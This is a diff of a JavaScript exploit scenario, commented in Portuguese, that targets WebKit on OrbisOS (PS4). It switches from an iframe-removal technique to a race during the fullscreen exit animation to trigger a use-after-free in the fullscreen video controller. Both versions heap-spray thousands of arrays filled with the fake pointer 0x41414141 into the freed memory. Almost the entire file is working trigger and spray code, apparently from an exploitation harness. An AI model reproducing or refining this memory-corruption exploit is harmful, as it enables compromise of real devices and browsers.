@@ -1,34 +1,25 @@
-
 /**
- * CENÁRIO: VIDEO_FULLSCREEN_IFRAME_DROP
- * Alvo: Teardown Automático do Fullscreen via Destruição de Documento
+ * CENÁRIO: VIDEO_FULLSCREEN_TRANSITION_CRASH
+ * Alvo: Race Condition durante a animação de saída (Exit Transition)
  */
 
 export default {
-    id:       'VIDEO_FULLSCREEN_IFRAME_DROP',
+    id:       'VIDEO_FULLSCREEN_TRANSITION_CRASH',
     category: 'Media',
     risk:     'CRITICAL',
-    description: 'Bypassa o Deadlock do OrbisOS implodindo o Iframe pai. ' +
-                 'O WebKit forçará um cancelFullScreen() automático enquanto ' +
-                 'destrói o MediaPlayerPrivate. O Spray preenche o buraco do Documento.',
+    description: 'Evita o UI Deadlock forçando o UAF *durante* a animação de saída. ' +
+                 'Garante que o OrbisOS já libertou o ecrã antes de matarmos o WebProcess.',
 
     setup: async function() {
-        // 1. Criamos a nossa "Caixa de Areia"
-        this.iframe = document.createElement('iframe');
-        this.iframe.setAttribute('allowfullscreen', 'true');
-        this.iframe.style.width = '100px';
-        this.iframe.style.height = '100px';
-        this.iframe.style.opacity = '0.01'; // Invisível
-        document.body.appendChild(this.iframe);
-
-        // 2. Colocamos o alvo lá dentro
-        const doc = this.iframe.contentDocument;
-        this.video = doc.createElement('video');
+        this.container = document.createElement('div');
+        document.body.appendChild(this.container);
+        
+        this.video = document.createElement('video');
         this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
         this.video.controls = true;
-        doc.body.appendChild(this.video);
+        this.container.appendChild(this.video);
 
-        // 3. A munição: 0x41414141
+        // A nossa munição (Ponteiro Falso)
         this.sprayPayload = new Uint32Array(256);
         this.sprayPayload.fill(0x41414141);
 
@@ -43,48 +34,52 @@ export default {
 
     trigger: async function() {
         try {
-            // 1. Entra no Fullscreen DE DENTRO do Iframe
+            // 1. Entramos em Fullscreen nativo
             if (this.video.webkitEnterFullscreen) {
                 this.video.webkitEnterFullscreen();
             } else if (this.video.webkitRequestFullscreen) {
                 this.video.webkitRequestFullscreen();
             }
+            
+            // Aguardamos que a entrada estabilize completamente
+            await new Promise(r => setTimeout(r, 500)); 
 
-            // Aguardamos o OrbisOS estabilizar a tela gráfica (crucial)
-            await new Promise(r => setTimeout(r, 400)); 
+            // 2. INICIAMOS A SAÍDA (O OrbisOS começa a devolver o ecrã)
+            if (document.webkitExitFullscreen) {
+                document.webkitExitFullscreen();
+            } else if (this.video.webkitExitFullscreen) {
+                this.video.webkitExitFullscreen();
+            }
 
-            // 2. A IMPLOSÃO (O Iframe Drop)
-            // Não removemos o vídeo. Removemos o UNIVERSO onde o vídeo existe.
-            // Isso força o C++ a rodar Document::detach() e limpar o FullscreenController.
-            this.iframe.remove();
+            // 3. A JANELA DE TRANSIÇÃO (A Mágica)
+            // Esperamos 50ms. O ecrã da PS4 já começou a encolher e o menu já está a reaparecer.
+            // O OrbisOS já não vai congelar.
+            await new Promise(r => setTimeout(r, 50)); 
 
-            // 3. SPRAY MASSIVO IMEDIATO
-            // O controlador de vídeo global vai tentar ler a memória do iframe destruído.
+            // 4. O GATILHO & SPRAY
+            // O FullscreenVideoController C++ ainda está na memória a limpar variáveis finais.
+            // Nós arrancamos o motor do player e enchemos o buraco!
+            this.video.removeAttribute('src');
+            this.video.load();
+
             this.spray = [];
-            for (let i = 0; i < 6000; i++) {
+            for (let i = 0; i < 5000; i++) {
                 let arr = new Uint32Array(256);
                 arr.set(this.sprayPayload);
                 this.spray.push(arr);
             }
 
-            // NOTA: Não chamamos exitFullscreen() manualmente. O WebKit fará 
-            // isso sozinho como consequência do iframe.remove(). 
-            // É aqui que a mágica da corrupção acontece.
-
         } catch(e) {}
     },
 
     probe: [
-        // Como o Iframe foi pro lixo, nós apenas tentamos forçar o GC
-        // acessando refs antigas, mas o crash geralmente acontece no C++.
-        s => s.video ? s.video.videoWidth : null,
-        s => s.video ? s.video.readyState : null
+        s => s.video.readyState,
+        s => s.video.webkitDecodedFrameCount
     ],
 
     cleanup: function() {
-        try { this.iframe.remove(); } catch(e) {}
+        try { this.container.remove(); } catch(e) {}
         this.spray = null;
         this.video = null;
-        this.iframe = null;
     }
 };
